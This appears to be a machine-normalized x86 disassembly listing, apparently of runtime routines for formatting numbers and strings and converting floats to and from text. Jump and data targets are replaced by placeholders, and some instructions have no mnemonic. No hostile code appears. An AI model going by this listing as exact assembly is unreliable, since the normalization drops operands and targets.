mov edx ebx
call sub_4086f0
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408920
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c3a0
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_4086f0
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407b40
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_4089a8
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408cff
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408a8a
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408ad2
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408a8a
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_40899c
pop edx
or edx edx
je r-xdata
sub_408a8a
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408cff
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408ad2
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408cff
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408920
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408af9 ]
mov ebx ecx
sub cl 0x44
je sub_407f58
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404110
jmp r-xdata
mov esi sub_404170
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_407f58
sub cl 0x44
je sub_407eec
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_407eec
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407f58
mov ecx 0x10
cmp bl 0x58
je sub_407eec
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_408978
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408eb8
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_407eec
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408d20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4086c4
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_4089a8
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408d60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4086c4
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_4089a8
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408db4
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_4041a8
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4041a8
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_4041a8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_4089a8
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_403fd8
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403ee8
mov eax esi
mov edx ebx
call sub_404534
mov eax [ ebp - 0x4 ]
call sub_4041a8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_4089a8
mov edx esi
xchg edx eax
call sub_404534
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408e74
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408eb8
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_409480
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408fb7
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408fc1
call sub_408fb7
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408e74
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_40901d
call sub_408fb7
call sub_408fae
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408fae
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408e74
retn
xor ecx ecx
sub_409059
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408fae
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408fae
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_4090be
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_409112
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_409059
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_40918c
push ebp
mov ebp esp
add esp 0xffffffb8
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov edi edx
mov ebx ecx
mov [ ebp - 0x8 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x9 ] al
mov al [ rw-data ]
mov [ ebp - 0xa ] al
mov ecx 0x2
cmp bl 0x0
je r-xdata
movzx eax [ edi + 0x8 ]
or eax [ edi ]
or eax [ edi + 0x4 ]
je r-xdata
mov eax [ edi ]
or eax [ edi + 0x4 ]
je r-xdata
call sub_40926e
je r-xdata
movzx ecx [ edi + 0x8 ]
shr ecx 0xf
mov ecx [ edi + 0x4 ]
shr ecx 0x1f
jmp r-xdata
push 0x0
push 0xf
push 0x0
mov eax [ ebp - 0x4 ]
mov edx edi
mov ecx ebx
call sub_408eb8
jmp r-xdata
call sub_4092a9
mov eax [ ebp - 0x10 ]
mov edx 0x270f
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x4
push eax
push edx
lea eax [ ebp - 0x30 ]
mov edx edi
mov ecx ebx
call sub_409480
mov ax [ ebp - 0x30 ]
cmp ax 0x8000
je r-xdata
sub eax [ ebp - 0x18 ]
mov edx eax
mov eax 0x12
cmp ax 0x7fff
je r-xdata
cmp bl 0x0
jne r-xdata
cmp [ ebp - 0x2d ] 0x0
jne r-xdata
cmp ax 0x12
jle r-xdata
call sub_409354
jmp r-xdata
mov ecx 0x2
call sub_40926e
je r-xdata
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
cmp esi [ ebp - 0x34 ]
je r-xdata
call sub_4092a9
sub_40926e
mov esi [ ebp + 0x8 ]
jecxz r-xdata
mov esi [ ebp + 0x8 ]
mov al [ esi ]
or al al
je r-xdata
lodsb [ esi ]
cmp al 0x27
je r-xdata
retn
cmp al 0x3b
mov ah al
cmp al 0x22
je r-xdata
or al al
jne r-xdata
or al al
je r-xdata
lodsb [ esi ]
cmp al ah
je r-xdata
jmp r-xdata
cmp al 0x3b
jne r-xdata
loop r-xdata
mov al [ esi ]
or al al
je r-xdata
cmp al 0x3b
jne r-xdata
sub_4092a9
push ebx
mov [ ebp - 0x34 ] esi
mov ebx 0x7fff
xor ecx ecx
xor edx edx
mov [ ebp - 0x18 ] 0xffffffff
mov [ ebp - 0x35 ] dl
mov [ ebp - 0x11 ] dl
inc edx
jmp r-xdata
cmp al 0x30
je r-xdata
lodsb [ esi ]
cmp edx ebx
jge r-xdata
cmp al 0x2e
je r-xdata
inc edx
mov ecx edx
jmp r-xdata
mov ebx edx
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
cmp al 0x2c
je r-xdata
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov [ ebp - 0x35 ] 0x1
jmp r-xdata
cmp al 0x27
je r-xdata
mov ah al
cmp al 0x22
je r-xdata
or al al
jne r-xdata
cmp al 0x45
je r-xdata
lodsb [ esi ]
cmp al ah
je r-xdata
jmp r-xdata
lodsb [ esi ]
cmp al 0x2d
je r-xdata
cmp al 0x65
je r-xdata
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
mov [ ebp - 0x11 ] 0x1
cmp al 0x2b
jne r-xdata
cmp al 0x3b
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax ecx
jle r-xdata
mov [ ebp - 0x18 ] edx
lodsb [ esi ]
cmp al 0x30
je r-xdata
jmp r-xdata
cmp al 0x23
je r-xdata
or al al
jne r-xdata
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x18 ]
sub eax ebx
jge r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x40 ] eax
pop ebx
retn
xor eax eax
sub_409354
cmp [ ebp - 0x11 ] 0x0
je r-xdata
movsx eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x18 ]
jg r-xdata
mov eax [ ebp - 0x18 ]
xor edx edx
jmp r-xdata
movsx edx [ ebp - 0x30 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x48 ] edx
mov esi [ ebp - 0x34 ]
mov edi [ ebp - 0x4 ]
lea ebx [ ebp - 0x2d ]
cmp [ ebp - 0x2e ] 0x0
je r-xdata
lodsb [ esi ]
cmp al 0x23
je r-xdata
cmp esi [ ebp + 0x8 ]
jne r-xdata
call sub_40940f
jmp r-xdata
cmp al 0x30
je r-xdata
mov al 0x2d
stosb [ edi ]
cmp al 0x2e
je r-xdata
cmp al 0x2c
je r-xdata
cmp al 0x27
je r-xdata
mov ah al
cmp al 0x22
je r-xdata
or al al
je r-xdata
cmp al 0x45
je r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
retn
stosb [ edi ]
jmp r-xdata
mov ah [ esi ]
cmp ah 0x2b
je r-xdata
cmp al 0x65
je r-xdata
lodsb [ esi ]
cmp al ah
je r-xdata
mov ecx 0xffffffff
cmp ah 0x2d
jne r-xdata
cmp al 0x3b
je r-xdata
inc ecx
inc esi
cmp [ esi ] 0x30
je r-xdata
cmp ecx 0x4
jb r-xdata
stosb [ edi ]
jmp r-xdata
xor ah ah
or al al
je r-xdata
push ebx
mov bl [ ebp - 0x2d ]
movsx edx [ ebp - 0x30 ]
sub edx [ ebp - 0x18 ]
call sub_408e74
pop ebx
jmp r-xdata
mov ecx 0x4
sub_40940f
cmp [ ebp - 0x48 ] 0x0
je sub_409430
jl r-xdata
inc [ ebp - 0x48 ]
mov eax [ ebp - 0x44 ]
cmp eax [ ebp - 0x40 ]
jle r-xdata
call sub_409430
dec [ ebp - 0x48 ]
jne r-xdata
mov al 0x30
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
jmp r-xdata
jmp sub_409430
stosb [ edi ]
cmp [ ebp - 0x35 ] 0x0
je r-xdata
mov ah al
mov al [ ebp - 0x9 ]
stosw [ edi ]
jmp r-xdata
dec [ ebp - 0x44 ]
retn
mov eax [ ebp - 0x44 ]
cmp eax 0x1
jle r-xdata
mov dl 0x3
div dl
cmp ah 0x1
jne r-xdata
mov al [ ebp - 0xa ]
test al al
je r-xdata
stosb [ edi ]
sub_409430
mov al [ ebx ]
inc ebx
or al al
jne r-xdata
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
dec ebx
mov eax [ ebp - 0x44 ]
cmp eax [ ebp - 0x3c ]
jle r-xdata
stosb [ edi ]
cmp [ ebp - 0x35 ] 0x0
je r-xdata
mov ah al
mov al [ ebp - 0x9 ]
stosw [ edi ]
jmp r-xdata
dec [ ebp - 0x44 ]
retn
mov al 0x30
mov eax [ ebp - 0x44 ]
cmp eax 0x1
jle r-xdata
mov dl 0x3
div dl
cmp ah 0x1
jne r-xdata
mov al [ ebp - 0xa ]
test al al
je r-xdata
stosb [ edi ]
sub_409480
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_4094ad
jmp r-xdata
call sub_4095cf
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_4094ad
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402cf4
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_4095cf
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_4096ac
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_409763
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_40976e
neg edx
mov ecx esi
call sub_40976e
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_409763
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_40978a
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402cf4
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_40976e
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_40978a
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_4097c0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408eb8
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403fd8
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4097f0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408eb8
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403fd8
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409820
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4041a8
cmp eax 0xe0
jle r-xdata
mov eax ebx
call sub_4043a8
push eax
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x100 ]
xor ecx ecx
call sub_40918c
mov ecx eax
lea edx [ ebp - 0x100 ]
mov eax esi
call sub_403fd8
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax [ rw-data ]
call sub_407b28
sub_409894
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043a8
mov edx esp
xor ecx ecx
call sub_4096ac
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4098c0
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043a8
mov edx esp
xor ecx ecx
call sub_4096ac
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409908
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_40994c
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
